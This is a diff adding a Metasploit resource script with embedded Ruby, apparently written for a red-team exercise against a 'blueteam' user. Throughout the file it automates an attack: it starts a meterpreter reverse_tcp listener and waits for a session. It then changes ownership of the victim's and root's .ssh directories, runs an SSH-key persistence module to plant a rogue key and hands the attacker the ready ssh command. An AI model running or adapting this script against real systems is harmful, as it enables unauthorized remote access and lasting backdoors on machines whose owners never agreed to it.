@@ -1,0 +1,182 @@
+spool /root/.msf4/logs/ubuntu-console.log
+<ruby>
+
+def help_me
+    help = %Q|
+ Description:
+   This RC file is used to automate setting up a listener in msfconsole and adds a rogue ssh key for the blueteam user.
+
+   Usage:
+   msfconsole -r [rc_path] [rhost] [lhost] [lport]
+
+ Arguments:
+   rc_path      - Full path to the RC script
+   rhost        - Remote target IP Address
+   lhost        - Local IP Address
+   lport        - Port to open locally for callback
+
+ Examples:
+   Get the help screen:
+     msfconsole -r shellshock.rc help
+   Attempt to pwn 10.0.0.5 from 10.0.0.130 using port 4445:
+     msfconsole -r shellshock.rc 10.0.0.5 10.0.0.130 4445
+
+ Author:
+   Jayson Grace (jayson.e.grace@gmail.com)
+    |
+
+    help = help.gsub(/^\t/, '')
+    print_line(help)
+end
+
+# Not perfect, but it will do
+def check_ip(target)
+    if !(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/).match(target)
+        raise ArgumentError, "Invalid IP address specified."
+    end
+end
+
+def check_reqd_args(args)
+    if args[:rhost] == nil
+        raise ArgumentError, "Missing RHOST value, use the help parameter and follow the instructions"
+    elsif args[:lhost] == nil
+        raise ArgumentError, "Missing LHOST value, use the help parameter and follow the instructions"
+    end
+end
+
+def init_args
+    args = {}
+    if ARGV.join('') =~ /^help$/i
+        args[:help] = true
+        return args
+    end
+
+    args[:rhost] = ARGV.shift
+    args[:lhost] = ARGV.shift
+    args[:lport] = ARGV.shift
+
+    check_reqd_args(args)
+
+    check_ip(args[:rhost])
+    check_ip(args[:lhost])
+
+    print_good "RHOST: #{args[:rhost]}"
+    print_good "LHOST: #{args[:lhost]}"
+    print_good "LPORT: #{args[:lport]}"
+
+    return args
+end
+
+$exploit = "use exploit/multi/handler"
+$payload = "set PAYLOAD linux/x64/meterpreter/reverse_tcp"
+$post_modules = ["use post/linux/manage/sshkey_persistence"]
+
+def run_exploit
+    tries = 10
+    begin
+        run_single $exploit
+        run_single $payload
+        run_single "set LHOST #{$local_host}"
+        run_single "set LPORT #{$local_port}"
+        run_single "set ExitOnSession false"
+        run_single "exploit -j -z"
+    rescue Exception => e
+        tries -= 1
+        if tries > 0
+            retry
+        else
+            print_error("Unable to establish a session because: #{e}")
+        end
+    end
+end
+
+def break_perms
+    run_single "sessions -c 'sudo chown -R www-data /home/blueteam/.ssh/'"
+    run_single "sessions -c 'sudo chown -R www-data /root/.ssh/'"
+end
+
+def run_post(post_module)
+    tries = 10
+    begin
+        run_single post_module
+        framework.sessions.each do |sid, s|
+            print_status "Attempting to run #{post_module}"
+            run_single "set SESSION #{sid}"
+            run_single "run"
+        end
+    rescue Exception => e
+        tries -= 1
+        if tries > 0
+            retry
+        else
+            print_error "Unable to run the post module due to this issue: #{e}"
+        end
+    end
+end
+
+def fix_perms
+    run_single "sessions -c 'sudo chown -R blueteam /home/blueteam/.ssh/'"
+    run_single "sessions -c 'sudo chown -R root /root/.ssh/'"
+end
+
+def copy_and_rename_file
+    log_loc = "/root/.msf4/logs/ubuntu-console.log"
+    new_file = ""
+    target = ""
+    File.readlines(log_loc).each do |line|
+        if /^.*as\s(\/.*default\_(.*)\_id.*)$/.match line
+            original_file = $1
+            target = $2
+            new_name = "#{$2}_private_key"
+            new_file = "#{Dir.pwd}/#{new_name}"
+            File.rename(original_file, new_file)
+        end
+    end
+    return new_file, target
+end
+
+def set_key_permissions(evil_key)
+    File.chmod(0600, evil_key)
+end
+
+def main
+    args = init_args
+
+    if args[:help]
+        help_me
+        run_single("exit")
+        return
+    end
+
+    $remote_host = args[:rhost]
+    $local_host = args[:lhost]
+    $local_port = args[:lport]
+
+    evil_key = ""
+    target = ""
+
+    run_exploit
+
+    # Wait for a session
+    until not framework.sessions.empty?
+        print_status "Waiting for session to be established..."
+        sleep 10
+    end
+    # Exploits are really unpredictable, so extra checks are warranted
+    if not framework.sessions.empty?
+        print_good "Session established!"
+        break_perms
+        $post_modules.each do |post_module|
+            run_post(post_module)
+        end
+        fix_perms
+        evil_key, target = copy_and_rename_file
+        set_key_permissions(evil_key)
+    end
+
+    print_good "Congrats on your new ssh key which can be found at #{evil_key}"
+    print_good "Use it like so: ssh -vv -i #{evil_key} #{target}"
+end
+
+main
+</ruby>
